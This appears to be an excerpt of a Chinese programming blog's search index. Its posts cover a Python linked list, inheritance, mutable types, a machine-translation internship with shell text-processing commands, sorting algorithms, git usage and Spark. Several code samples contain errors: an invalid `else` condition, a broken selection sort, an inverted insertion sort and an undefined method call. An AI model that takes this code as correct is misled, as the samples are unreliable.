node</span><br><span class="line">            return self.head</span><br><span class="line">    def delete(self,data):#删除数值为data的节点，判断当前节点的下一个节点的值是否等于要删除的值，如果是则将当前节点的指针指向当前结点下一个节点的下一个节点。</span><br><span class="line">        if self.head is None:</span><br><span class="line">            return</span><br><span class="line">        if self.head.val &#x3D;&#x3D; data:</span><br><span class="line">            self.head &#x3D; self.head.next</span><br><span class="line">            return</span><br><span class="line">        curr_node &#x3D; self.head</span><br><span class="line">        while curr_node.next is not None:</span><br><span class="line">            if curr_node.next.val &#x3D;&#x3D; data:</span><br><span class="line">                curr_node.next &#x3D; curr_node.next.next</span><br><span class="line">                return</span><br><span class="line">            curr_node &#x3D; curr_node.next</span><br><span class="line">    def deleteRepeat(self):#删除链表中重复的元素，初始化一个空的列表用来存放已经出现过的链表元素，查看当前节点的下一个节点的值是否已经出现在列表中如果出现则将其删除。</span><br><span class="line">        uniq &#x3D; []</span><br><span class="line">        if self.head is None:</span><br><span class="line">            return</span><br><span class="line">        curr_node &#x3D; self.head</span><br><span class="line">        uniq.append(self.head.val)</span><br><span class="line">        while curr_node.next is not None:</span><br><span class="line">            if curr_node.next.val in uniq:</span><br><span class="line">                curr_node.next &#x3D; curr_node.next.next</span><br><span class="line">            else:</span><br><span class="line">                uniq.append(curr_node.next.val)</span><br><span class="line">                curr_node &#x3D; curr_node.next</span><br><span class="line">       return </span><br></pre></td></tr></table></figure><h2 id="测试："><a href="#测试：" class="headerlink" title="测试："></a>测试：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">tmp &#x3D; LinkedList()</span><br><span class="line">tmp.append(1)</span><br><span class="line">tmp.append(2)</span><br><span class="line">tmp.insertToFront(1)</span><br><span class="line">tmp.append(3)</span><br><span class="line">tmp.append(4)</span><br><span class="line">tmp.append(5)</span><br><span class="line">tmp.deletere()</span><br><span class="line">tmp.printNode()</span><br></pre></td></tr></table></figure><h2 id="输出为："><a href="#输出为：" class="headerlink" title="输出为："></a>输出为：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td></tr></table></figure>]]></content>
-      
-      
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>Python的继承和多态</title>
-      <link href="2019/10/05/Python%E7%9A%84%E7%BB%A7%E6%89%BF%E5%92%8C%E5%A4%9A%E6%80%81/"/>
-      <url>2019/10/05/Python%E7%9A%84%E7%BB%A7%E6%89%BF%E5%92%8C%E5%A4%9A%E6%80%81/</url>
-      
-        <content type="html"><![CDATA[<h1 id="Python类的继承"><a href="#Python类的继承" class="headerlink" title="Python类的继承"></a>Python类的继承</h1><p>定义一个父类Person:  </p><pre><code>class Person(object):    def __init__(self,name,sex):        self.name = name        self.sex = sex    def print_title(self):        if self.sex == &quot;male&quot;:            print(&quot;man&quot;)        else self.sex == &quot;female&quot;:            print(&quot;woman&quot;)</code></pre><p>定义一个Child类继承父类Person:</p><pre><code>class Child(Person):    pass</code></pre><p>新建子类和父类的对象：</p><pre><code>May = Child(&quot;May&quot;,&quot;female&quot;)Peter = Person(&quot;Peter&quot;,&quot;male&quot;) print(May.name,May.sex,Peter.name,Peter.sex)#子类将继承父类的方法和属性May.print_title()Peter.print_title()</code></pre><h2 id="Python两个判断继承的函数：isinstance-和issubclass"><a href="#Python两个判断继承的函数：isinstance-和issubclass" class="headerlink" title="Python两个判断继承的函数：isinstance()和issubclass()"></a>Python两个判断继承的函数：isinstance()和issubclass()</h2><p>isinstance()用于检查实例的类型,issubclass()用于检查类继承：</p><pre><code>isinstance(May,Child) == Trueissubclass(Child,Person)==True</code></pre><h1 id="Python类的多态"><a href="#Python类的多态" class="headerlink" title="Python类的多态"></a>Python类的多态</h1><p>子类可以重写父类的方法，如果子类在创建时重新父类的方法则父类的方法被覆盖，如果不重写则可以直接使用父类的方法。</p><pre><code>class Child(Person):#重写print_title()方法                   def print_title(self):        if self.sex == &quot;male&quot;:            print(&quot;boy&quot;)        elif self.sex == &quot;female&quot;:            print(&quot;girl&quot;)</code></pre><h1 id="Python使用下划线作为变量前缀和后缀制定特殊方法-变量"><a href="#Python使用下划线作为变量前缀和后缀制定特殊方法-变量" class="headerlink" title="Python使用下划线作为变量前缀和后缀制定特殊方法/变量"></a>Python使用下划线作为变量前缀和后缀制定特殊方法/变量</h1><ul><li>__foo被看作是类”私有的“，类外和子类都不能访问，不能用‘from module import *’导入，只能通过类对象访问。</li><li>_foo 被看作是类”受保护的“，只有类对象和子类对象自己能访问，不能通过‘from module import *’导入。</li><li>_<em>foo</em>_ 代表Python里特殊方法专用标识。</li></ul><h1 id="Python的构造函数-new-和初始化函数-init"><a href="#Python的构造函数-new-和初始化函数-init" class="headerlink" title="Python的构造函数_new_()和初始化函数_init_()"></a>Python的构造函数_<em>new_</em>()和初始化函数_<em>init_</em>()</h1><ul><li><p>“_<em>new_</em>(cls,*args,**kargs)“方法在Python中是真正的构造方法（创建并返回实例），是在类实例化对象时第一个调用的方法，将返回实例对象，通过这个方法可以产生一个”cls”对应的实例对象，所以说”__ new__(cls,*args,**kargs)”方法一定要有返回</p></li><li><p>对于”__ init__ (self,*args,**kwags)“方法，是一个初始化的方法，“self”代表由类产生出来的实例对象，” _<em>init_</em>(self,*args,**kwags)”将对这个对象进行相应的初始化操作。</p></li></ul>]]></content>
-      
-      
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>python可变数据类型和不可变数据类型</title>
-      <link href="2019/09/25/python%E5%8F%AF%E5%8F%98%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E5%92%8C%E4%B8%8D%E5%8F%AF%E5%8F%98%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/"/>
-      <url>2019/09/25/python%E5%8F%AF%E5%8F%98%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E5%92%8C%E4%B8%8D%E5%8F%AF%E5%8F%98%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/</url>
-      
-        <content type="html"><![CDATA[<h1 id="Python的可变数据类型和不可变数据类型："><a href="#Python的可变数据类型和不可变数据类型：" class="headerlink" title="Python的可变数据类型和不可变数据类型："></a>Python的可变数据类型和不可变数据类型：</h1><h2 id="可变数据类型："><a href="#可变数据类型：" class="headerlink" title="可变数据类型："></a>可变数据类型：</h2><p>list：数组是有序的，dict:字典是无序的，多次print一个数组得到的字典顺序可能不一样，可变的set：集合是无序不重复的。Python在声明可变类型后再次声明同样内容的可变类型时，Python会重新申请空间对其进行存储。例如：a=[1,2,3],b=[1,2,3],a is b False， a==b True。is可以用来判断两个变量是否指向同一地址，”==“来判断两个变量的值是否相等。”=“是赋值操作，当a=b时，a,b指向的是同一地址，改变a的值，b的值也会发生变化。</p><h2 id="不可变数据类型："><a href="#不可变数据类型：" class="headerlink" title="不可变数据类型："></a>不可变数据类型：</h2><p>string,数值类型，元祖：有序的，不可变set.Python在声明不可变数据类型时会在已经声明的不可变类型对象中找该对象是否已经被声明过，如果已经声明过则变量会直接指向该对象，不会再申请新的内存空间。相当于增加了对象的引用。</p>]]></content>
-      
-      
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>机器翻译实习总结</title>
-      <link href="2019/07/05/%E6%9C%BA%E5%99%A8%E7%BF%BB%E8%AF%91%E5%AE%9E%E4%B9%A0%E6%80%BB%E7%BB%93/"/>
-      <url>2019/07/05/%E6%9C%BA%E5%99%A8%E7%BF%BB%E8%AF%91%E5%AE%9E%E4%B9%A0%E6%80%BB%E7%BB%93/</url>
-      
-        <content type="html"><![CDATA[<h1 id="机器翻译（中英）实习总结"><a href="#机器翻译（中英）实习总结" class="headerlink" title="机器翻译（中英）实习总结"></a>机器翻译（中英）实习总结</h1><p>2019年5月-7月参与机器翻译项目，接下来将对这两个月的收获进行总结。</p><h2 id="Transform模型的理解"><a href="#Transform模型的理解" class="headerlink" title="Transform模型的理解"></a>Transform模型的理解</h2><blockquote><p>谷歌提出的transformer模型，使用self-attention层和全连接层实现了很好的机器翻译BLEU结果，没有采用传统的RNN/LSTM/GRU结构，解决了长依赖和训练并行度问题，降低了计算的复杂度。关于论文的详细讲解可以参考：<a href="https://www.jianshu.com/p/ef41302edeef%E7%AD%89%E7%9A%84%E8%AE%B2%E8%A7%A3%E3%80%82">https://www.jianshu.com/p/ef41302edeef等的讲解。</a></p></blockquote><ul><li><strong>Attention机制</strong>  </li></ul><p>** 简介:**<br>在传统的encoder-decoder模型中，对于句子对&lt;X,Y&gt;,，我们输入给定句子X=&lt;x1,x2…xm&gt; 经过encoder进行编码后转化为中间语义表示为C=F(x<sub>1</sub>,x<sub>2</sub>…x<sub>m</sub>)，解码器decoder的任务是根据句子的中间语义表示C和之前已经生成的历史信息y<sub>1</sub>,y<sub>2</sub>…y<sub>i-1</sub>)来生成i时刻要生成的单词yi=G(C,y<sub>1</sub>,y<sub>2</sub>…y<sub>i-1</sub>)。<br>这样的框架因为对于预测每一个yi对应的语义编码C都是一样的，无法完全表示整个序列的信息，而且先输入的内容携带的信息会被后面的信息覆盖掉。attention机制将用来解决该问题，在预测时不仅关注全局语义编码向量C，而且增加‘注意力范围’，来表示接下来输出词时候要重点关注输入序列的哪些部分。<br><img src="/images/nmt/Attention.png" alt="attention"><br>此时生成目标句子单词的过程就成了下面的形式:<br>y<sub>1</sub>=f1(C<sub>1</sub>)<br>y<sub>2</sub>=f1(C<sub>2</sub>,y<sub>1</sub>)<br>y<sub>3</sub>=f1(C<sub>3</sub>,y<sub>1</sub>,y<sub>2</sub>)<br><strong>计算过程：</strong>1、计算encoder每个结点与decoderd当前结点的Score值：<br>[s1,s2,s3,s4]=softmax(dot([x1,x2,x3,x4],yi-1))<br>2、当前结点的语义编码为Ci=s1*x1+s2*x2+s3*x3+s4*x4</p><ul><li><strong>self-attention机制</strong><br>self-attention是attention机制的一种，attention是输入输出的权重，而self-attention是自己对自己的权重，计算公式如下图：<br><img src="/images/nmt/self-attention.png" alt="self-attention"><br>Q(queries)，K (keys) and V(Values)， 其中 Key and values 一般对应同样的 vector， K=V 而Query vecotor  是对应目标句子的 word vector。</li><li><strong>论文代码的理解</strong><br>所查看的代码使用tensorflow框架，其各个函数的调用以及参数传递如下图：<br><img src="/images/nmt/transformer-function.png" alt="transformer"><br>这里使用了TensorFlow中的高级API：Estimator、Experiment,具体讲解可以参考：<a href="https://www.jiqizhixin.com/articles/2017090901">https://www.jiqizhixin.com/articles/2017090901</a></li></ul><p><img src="/images/nmt/API.png" alt="API">  </p><h2 id="shell命令总结"><a href="#shell命令总结" class="headerlink" title="shell命令总结"></a>shell命令总结</h2><p>语料库中包含两千多万条训练数据，经过了一系列的过滤得到一个干净整洁的训练预料。在过程中主要用shell对其进行处理，提高处理的速度和效率。接下来将对过程中使用到的shell命令进行总结。</p><ul><li><strong>awk</strong><br>awk用来对文本进行较复杂格式处理,<a href="https://www.cnblogs.com/silence-hust/p/4534606.html">https://www.cnblogs.com/silence-hust/p/4534606.html</a> 中对awk做了较为详细的汇总。<blockquote><p>1、统计英文文本中每行的单词个数可以用命令：<br>awk -F ‘ ‘ ‘BEGIN{print “count”, “lineNum”}{print NF “\t” NR}’ filename 其中，-F 表示分隔符，NF是awk的内置函数表示读取记录的域的个数，NR表示已经读取的记录数，文件的每行相当于记录，文件的每个字段，也就是每个单词相当于记录的域。其中BEGIN后面所跟的命令只会在遍历文件前执行一次，END命令也会在遍历完文件后执行一次。<br>2、删除英文文本中单词数量少于5的行可以用命令：<br>awk -F ‘ ‘ ‘{if (NF &lt; 5) {next} {print}}’ filename 其中，if会用来做判断，如果满足条件将会调用{next}直接跳到下一行，如果不满足会执行{print}输出当前行。<br>3、awk ‘!a[$0]++’ filename 将会去除文件中重复的行，’!’表示非，$0表示当前行，a[$0]以当前行为数据下标建立数组a,a[$0]++表示给数组a赋值，a[$0]+=1。详细解释可以参照：<a href="https://www.cnblogs.com/irockcode/p/7044646.html">https://www.cnblogs.com/irockcode/p/7044646.html</a>  </p></blockquote></li><li><strong>grep</strong><br>grep更适合单纯的查找和匹配文本， <a href="https://blog.csdn.net/liupeifeng3514/article/details/79880878">https://blog.csdn.net/liupeifeng3514/article/details/79880878</a> 中对grep命令做了详细的介绍。<blockquote><p>1、统计出现文本中出现某种模式n词以上的行：grep -E ‘(pattern){n,}’ filename 其中-E表示使用正则表达式，(pattern)是要找的某种模式，用正则表达式进行匹配，{n,}表示连续出现n次以上。<br>2、grep -f file1 file2 过滤掉文件2中包含文件1的内容。 如果添加 -v 可以实现反向输出，即可以输出两个文件重复的行。</p></blockquote></li><li><strong>shell效率问题</strong><br>因为数据量在千万级，所以一个好的处理策略要比处理工具更加重要，本次项目是中-英的机器翻译，所以在对数据筛选时要同时兼顾两个文件，即源端数据文本和目标端数据文本，在去重的过程中一开始的想法是将源段出现重复和行号找出后保存在文件中，之后删除目标段对应的行，但速度会很慢。<br>后来利用paste 先将两个文件用TAB作为分隔符左右拼接起来：<br>paste -d\t file1 file2 &gt; tempfile<br>之后利用awk去除重复行：<br>awk -F ‘\t’ ‘!a[$1]++’ tempfile &gt; uniqfile 这里的$1表示第一列即源段文本。<br>最后用cut将其分开。<br>后来看到了<a href="https://blog.csdn.net/dubendi/article/details/79103170%EF%BC%8C%E5%85%B3%E4%BA%8E%E5%A6%82%E4%BD%95%E6%8F%90%E9%AB%98shell%E6%95%88%E7%8E%87%E7%9A%84%E5%8D%9A%E5%AE%A2%E3%80%82">https://blog.csdn.net/dubendi/article/details/79103170，关于如何提高shell效率的博客。</a></li><li><strong>shell输出重定向</strong><br><img src="/images/nmt/stdout.png" alt="stdout"><br>在此次项目中原始训练集在一个文件中，按照一行源段，一行目标端，一行空格来放。所以首要任务是将其分成两个文件，这里利用重定向写了一小段shell脚本：<pre><code class="#!/usr/bin/perl">$n=0;while(&lt;&gt;)&#123;chomp();if($n%3==0)&#123;print STDOUT &quot;$_\n&quot;;&#125;if($n%3==1)&#123;print STDERR &quot;$_\n&quot;;&#125;$n+=1;&#125;</code></pre>初始化变量n,用来表示读取的是源段还会目标端的行，按行读取文件，当是空行时用chomp()删除改行，如果不是判断n是否能被3整除，如果可以的话用标准输出将其输出，如果不是的话用标准错误输出将其输出，最后在命令行运行该脚本：$./vcut.pl sg-mt.txt 2&gt; train.en 1&gt; train.zh 实现将两中文本分开。</li></ul>]]></content>
-      
-      
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>常见排序算法总结</title>
-      <link href="2019/04/16/%E5%B8%B8%E8%A7%81%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95%E6%80%BB%E7%BB%93/"/>
-      <url>2019/04/16/%E5%B8%B8%E8%A7%81%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95%E6%80%BB%E7%BB%93/</url>
-      
-        <content type="html"><![CDATA[<h1 id="常见排序算法总结"><a href="#常见排序算法总结" class="headerlink" title="常见排序算法总结"></a>常见排序算法总结</h1><h2 id="冒泡排序"><a href="#冒泡排序" class="headerlink" title="冒泡排序"></a>冒泡排序</h2><h3 id="基本思想："><a href="#基本思想：" class="headerlink" title="基本思想："></a>基本思想：</h3><blockquote><p>比较序列中相邻两个数据的大小，如果两个数的排序方式和目标相反则调换两个数的位置。</p></blockquote><h3 id="代码实现-python-："><a href="#代码实现-python-：" class="headerlink" title="代码实现(python)："></a>代码实现(python)：</h3><pre><code>def bubble_sort(mylist):    n = len(mylist)    for j in range(n-1):        for i in range(0,n-1-j):            count = 0            if mylist[i]&gt;mylist[i+1]:                mylist[i], mylist[i+1]=mylist[i+1],mylist[i]                count+=1         if count == 0:             break</code></pre><h3 id="时间复杂度："><a href="#时间复杂度：" class="headerlink" title="时间复杂度："></a>时间复杂度：</h3><blockquote><p>最好情况：正序有序，则只需要比较n次不需要交换位置，则时间复杂度为O(n)。<br>最坏情况：逆序有序，则需要比较(n-1)+(n-2)+……+1，则时间复杂度为O(n<em>n)。<br>平均情况：O(n</em>n)。</p></blockquote><h3 id="稳定性："><a href="#稳定性：" class="headerlink" title="稳定性："></a>稳定性：</h3><blockquote><p>稳定性是指序列中两个相等的数在经过排序算法后两个数的位置是否会发生变化，因为冒泡排序当相邻两个数相等时不会交换他们的位置，所以冒泡算法是稳定的。</p></blockquote><h2 id="插入排序"><a href="#插入排序" class="headerlink" title="插入排序"></a>插入排序</h2><h3 id="基本思想：-1"><a href="#基本思想：-1" class="headerlink" title="基本思想："></a>基本思想：</h3><blockquote><p>序列中的数往前依次与其前面的数作比较寻找该数的合适位置，直至最后一个元素。</p></blockquote><h3 id="代码实现-python"><a href="#代码实现-python" class="headerlink" title="代码实现(python)"></a>代码实现(python)</h3><pre><code>def insertion_sort(mylist):    n = len(mylist)    for i in range(1,n):        for j in range(i,0,-1):            if mylist[j]&gt;mylist[j-1]:                mylist[j],mylist[j-1]=mylist[j-1],mylist[j]                else:                    break</code></pre><h3 id="时间复杂度：-1"><a href="#时间复杂度：-1" class="headerlink" title="时间复杂度："></a>时间复杂度：</h3><blockquote><p>最好情况：正序有序，比较n次不需要交换位置，时间复杂度为O(n)。<br>最坏情况：逆序有序，比较n个元素需要跟前面的n-1个元素比较，时间复杂度为O(n^2)。<br>平均情况：O(n^2)。</p></blockquote><h3 id="稳定性：-1"><a href="#稳定性：-1" class="headerlink" title="稳定性："></a>稳定性：</h3><blockquote><p>当两个元素比较时如果两个元素相等则不需要移动，所以插入排序是稳定的。 </p></blockquote><h2 id="选择排序"><a href="#选择排序" class="headerlink" title="选择排序"></a>选择排序</h2><h3 id="基本思想：-2"><a href="#基本思想：-2" class="headerlink" title="基本思想："></a>基本思想：</h3><blockquote><p>每次从待排序的数据元素中直接选择最大或者最小的元素作为序列的第一个元素。</p></blockquote><h3 id="代码实现（Python）"><a href="#代码实现（Python）" class="headerlink" title="代码实现（Python）"></a>代码实现（Python）</h3><pre><code>def selection_sort(mylist):    n = len(mylist)    for i in range(0,n-1):        min = mylist[i]        for j in range(1,n):            if min &gt; mylist[j]:               min = mylist[j]        if min != mylist[i]:            temp = min            min = mylist[j]            mylist[j]=min</code></pre><h3 id="时间复杂度：-2"><a href="#时间复杂度：-2" class="headerlink" title="时间复杂度："></a>时间复杂度：</h3><blockquote><p>最好情况：O(n^2)<br>最坏情况：O(n^2)<br>平均情况：O(n^2)  </p></blockquote><h3 id="稳定性：-2"><a href="#稳定性：-2" class="headerlink" title="稳定性："></a>稳定性：</h3><blockquote><p>不稳定</p></blockquote><h2 id="希尔排序"><a href="#希尔排序" class="headerlink" title="希尔排序"></a>希尔排序</h2><h3 id="基本思想：-3"><a href="#基本思想：-3" class="headerlink" title="基本思想："></a>基本思想：</h3><blockquote><p>希尔排序是把记录按下标的一定增量分组，对每组使用直接插入排序算法排序；随着增量逐渐减少，每组包含的关键词越来越多，当增量减至1时，整个文件恰被分成一组，算法便终止。  </p></blockquote><h3 id="过程示意图："><a href="#过程示意图：" class="headerlink" title="过程示意图："></a>过程示意图：</h3><p>![shell_sort](/images/sort/shell’s sort.jpg)</p><h2 id="归并排序"><a href="#归并排序" class="headerlink" title="归并排序"></a>归并排序</h2><h3 id="基本思想：-4"><a href="#基本思想：-4" class="headerlink" title="基本思想："></a>基本思想：</h3><blockquote><p>将已有序的子序列合并，得到完全有序的序列；即先使每个子序列有序，再使子序列段间有序。若将两个有序表合并成一个有序表，称为二路归并</p></blockquote><h3 id="示例："><a href="#示例：" class="headerlink" title="示例："></a>示例：</h3><blockquote><p>归并操作(merge)，也叫归并算法，指的是将两个顺序序列合并成一个顺序序列的方法。<br>如　设有数列{6，202，100，301，38，8，1}<br>初始状态：6,202,100,301,38,8,1<br>第一次归并后：{6,202},{100,301},{8,38},{1}，比较次数：3；<br>第二次归并后：{6,100,202,301}，{1,8,38}，比较次数：4；<br>第三次归并后：{1,6,8,38,100,202,301},比较次数：4；<br>总的比较次数为：3+4+4=11；<br>逆序数为14；  </p></blockquote><h3 id="小结："><a href="#小结：" class="headerlink" title="小结："></a>小结：</h3><blockquote><p>归并排序的速度仅次于快速排序，且是一种稳定的排序算法。</p></blockquote><h2 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h2><h3 id="基本思想：-5"><a href="#基本思想：-5" class="headerlink" title="基本思想："></a>基本思想：</h3><blockquote><p>任意选取待排序数组中的一个数作为关键数，将待排序数组中比关键数小的数都位于关键数的左边，比关键数大的数都在关键数的右边。</p></blockquote><h3 id="排序演示："><a href="#排序演示：" class="headerlink" title="排序演示："></a>排序演示：</h3><blockquote><p>假设一开始序列{xi}是：5，3，7，6，4，1，0，2，9，10，8。<br>此时，选取关键数为序列的第一个元素：ref=5，i=1，j=11。<br>从后往前找，第一个比5小的数是x8=2，因此序列为：2，3，7，6，4，1，0，5，9，10，8。<br>此时i=1，j=8，从前往后找，第一个比5大的数是x3=7，因此序列为：2，3，5，6，4，1，0，7，9，10，8。<br>此时，i=3，j=8，从第8位往前找，第一个比5小的数是x7=0，因此：2，3，0，6，4，1，5，7，9，10，8。<br>此时，i=3，j=7，从第3位往后找，第一个比5大的数是x4=6，因此：2，3，0，5，4，1，6，7，9，10，8。<br>此时，i=4，j=7，从第7位往前找，第一个比5小的数是x6=1，因此：2，3，0，1，4，5，6，7，9，10，8。<br>此时，i=4，j=6，从第4位往后找，直到第6位才有比5大的数，这时，i=j=6，ref成为一条分界线，它之前的数都比它小，之后的数都比它大，对于前后两部分数，可以采用同样的方法来排序。</p></blockquote><h3 id="小结：-1"><a href="#小结：-1" class="headerlink" title="小结："></a>小结：</h3><blockquote><p>快速排序是一种不稳定的排序算法，最好情况下的时间复杂度为O(nlog^n),最坏情况下为：O(n^2),平均情况下为：O(nlog^n)。</p></blockquote>]]></content>
-      
-      
-      
-        <tags>
-            
-            <tag> sorts </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>解释性语言和编译型语言的区别</title>
-      <link href="2019/03/25/%E8%A7%A3%E9%87%8A%E6%80%A7%E8%AF%AD%E8%A8%80%E5%92%8C%E7%BC%96%E8%AF%91%E5%9E%8B%E8%AF%AD%E8%A8%80%E7%9A%84%E5%8C%BA%E5%88%AB/"/>
-      <url>2019/03/25/%E8%A7%A3%E9%87%8A%E6%80%A7%E8%AF%AD%E8%A8%80%E5%92%8C%E7%BC%96%E8%AF%91%E5%9E%8B%E8%AF%AD%E8%A8%80%E7%9A%84%E5%8C%BA%E5%88%AB/</url>
-      
-        <content type="html"><![CDATA[<h1 id="解释性语言和编译型语言的区别"><a href="#解释性语言和编译型语言的区别" class="headerlink" title="解释性语言和编译型语言的区别"></a>解释性语言和编译型语言的区别</h1><blockquote><p>在高级语言编程中需要将高级语言翻译成计算机能够理解的机器语言。其中的翻译又分为两种方式：一种是编译，一种是解释。</p></blockquote><ul><li>解释性语言翻译的过程是在运行的过程中进行的。Java是编译-解释型，Javac命令首先将程序源码的.java文件编译成 .class字节码文件，之后Java虚拟机边读取边翻译边执行。</li><li>编译型语言需要在运行之前有单独的翻译过程。C语言的编译过程包括：C源程序–&gt;预编译处理(.c)–&gt;编译、优化程序(.s、.asm)–&gt;汇编程序(.obj、.o、.a、.ko)–&gt;链接程序(.exe、.elf、.axf等)</li></ul>]]></content>
-      
-      
-      
-        <tags>
-            
-            <tag> Java/C </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>向github提交本地仓库</title>
-      <link href="2019/03/09/%E5%90%91gitHub%E6%8F%90%E4%BA%A4%E6%9C%AC%E5%9C%B0%E4%BB%93%E5%BA%93/"/>
-      <url>2019/03/09/%E5%90%91gitHub%E6%8F%90%E4%BA%A4%E6%9C%AC%E5%9C%B0%E4%BB%93%E5%BA%93/</url>
-      
-        <content type="html"><![CDATA[<h2 id="如果需要将本地生成的工程提交到github相应的仓库中的步骤如下："><a href="#如果需要将本地生成的工程提交到github相应的仓库中的步骤如下：" class="headerlink" title="如果需要将本地生成的工程提交到github相应的仓库中的步骤如下："></a>如果需要将本地生成的工程提交到github相应的仓库中的步骤如下：</h2><blockquote><p>1、在github上新建立相应的仓库名称，比如：blog。</p></blockquote><blockquote><p>2、cd到本地工程的根目录下。</p></blockquote><blockquote><p>3、使用命令：git init 初始化本地仓库。</p></blockquote><blockquote><p>4、使用命令：git add ××× 添加要提交到github远程仓库的文件或者文件<br>夹，如果全部提交可以使用：git add . 。</p></blockquote><blockquote><p>5、git commit -m “备注”。</p></blockquote><blockquote><p>6、git remote add origin <a href="https://github.com/weizhaome/blog">https://github.com/weizhaome/blog</a> 建立远程仓库链接。</p></blockquote><blockquote><p>7、最后使用 git push -u origin master 就可以将本地工程提交到github上了。</p></blockquote><h2 id="遇见的问题："><a href="#遇见的问题：" class="headerlink" title="遇见的问题："></a>遇见的问题：</h2><blockquote><p>1、当github远程仓库中存在本地仓库所不存在的文件时需要先将两部分进行合并：git pull –rebase origin master 之后再执行push操作。</p></blockquote><blockquote><p>2、Push 一直提示 “Permission denied (publickey) “ , 这个可能是由于你的没有目标仓库和分支的权限，导致无法更新数据。</p><ul><li>确认 push 方式，如果是 SSH 方式请检查你的 SSH 公钥是否正确（如果您有多个私钥，请使用 ssh-add 命令来指定默认使用的私钥）； HTTPS 方式检查密码及用户名是否正确。</li><li>对目标分支是否有写权限。</li><li>善用 搜索。</li></ul></blockquote>]]></content>
-      
-      
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>Spark reduceByKey使用时遇到的问题</title>
-      <link href="2018/09/27/Spark-reduceByKey%E4%BD%BF%E7%94%A8%E6%97%B6%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/"/>
-      <url>2018/09/27/Spark-reduceByKey%E4%BD%BF%E7%94%A8%E6%97%B6%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/</url>
-      
-        <content type="html"><![CDATA[<h1 id="reduceByKey-func-不会处理单一值的RDD"><a href="#reduceByKey-func-不会处理单一值的RDD" class="headerlink" title="reduceByKey(func)不会处理单一值的RDD"></a>reduceByKey(func)不会处理单一值的RDD</h1><ul><li><p>reduceByKey(func)的功能是，使用func函数合并具有相同键的值。比如，reduceByKey((a,b) =&gt; a+b)，有四个键值对(“spark”,1)、(“spark”,2)、(“hadoop”,3)和(“hadoop”,5)，对具有相同key的键值对进行合并后的结果就是：(“spark”,3)、(“hadoop”,8)。</p></li><li><p><strong>但是，当reduceByKey(func)中的func函数对值进行split操作时，对于只有唯一值的RDD不会被split。下面使用创建的简单数据进行说明:</strong></p></li></ul><blockquote><p>统计原始数据中相同姓名都出现了哪些数字，原始数据如下图所示：</p></blockquote><p><img src="/images/reduceByKey-question/rawdata.jpg" alt="github"></p><p>可以看到数据中姓名后面的数字中含有”\t”。</p><blockquote><p>读取文件数据并将其map成键值对的形式，得到的结果如下图所示：</p></blockquote><p><img src="/images/reduceByKey-question/FirstMap.jpg" alt="github"></p><p>我们看到数据读入后”\t”变为”\\t”,姓名成为键，后面的数字成为了值。</p><blockquote><p>使用reduceByKey合并相同姓名后面出现的数字，在这个过程中使用split(“\t”)对值进行切分。</p></blockquote><p><img src="/images/reduceByKey-question/reduceByKey.jpg" alt="github"></p><p>从结果中可以看出，“xiaoguniang” 的值并没有被split.reduceByKey中不能对唯一值的RDD进行后面的func。也就是说当只有一个值的RDD出现时reduceByKey是不对其进行处理的。</p><blockquote><p>为此，为了达到想要的效果我们对代码进行改进，使用mapValue()对Value进行预处理，之后再进行reduceByKey()。</p></blockquote><p><img src="/images/reduceByKey-question/improve.jpg" alt="github"></p>]]></content>
-      
-      
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>Spark Streaming</title>
-      <link href="2018/09/18/Spark-Streaming/"/>
-      <url>2018/09/18/Spark-Streaming/</url>
-      
-        <content type="html"><![CDATA[<h1 id="Spark-Streaming"><a href="#Spark-Streaming" class="headerlink" title="Spark Streaming"></a>Spark Streaming</h1><blockquote><p>Spark Streaming是构建在Spark上的实时计算框架，它扩展了Spark处理大规模流式数据的能力。Spark Streaming可结合批处理和交互查询，适合一些需要对历史数据和实时数据进行结合分析的应用场景。Spark Streaming最主要的抽象是DStream（Discretized Stream，离散化数据流），表示连续不断的数据流。在内部实现上，Spark Streaming的输入数据按照时间片（如1秒）分成一段一段的DStream，每一段数据转换为Spark中的RDD，并且对DStream的操作都最终转变为对相应的RDD的操作。</p></blockquote><h2 id="Spark-Streaming程序基本步骤"><a href="#Spark-Streaming程序基本步骤" class="headerlink" title="Spark Streaming程序基本步骤"></a>Spark Streaming程序基本步骤</h2><ol><li>通过创建输入DStream来定义输入源。</li><li>通过对DStream应用转换操作和输出操作来定义流计算。</li><li>用streamingContext.start()来开始接收数据和处理流程。</li><li>通过streamingContext.awaitTermination()方法来等待处理结束（手动结束或因为错误而结束）。</li><li>可以通过streamingContext.stop()来手动结束流计算进程。<h2 id="RDD队列流"><a href="#RDD队列流" class="headerlink" title="RDD队列流"></a>RDD队列流</h2><blockquote><p>在调试Spark Streaming应用程序的时候，我们可以使用streamingContext.queueStream(queueOfRDD)创建基于RDD队列的DStream。</p></blockquote></li></ol><p>下面是参考Spark官网的QueueStream程序设计的程序，每隔1秒创建一个RDD，Streaming每隔2秒就对数据进行处理。</p><p><img src="/images/RDD%E9%98%9F%E5%88%97%E6%B5%81.png" alt="Github" 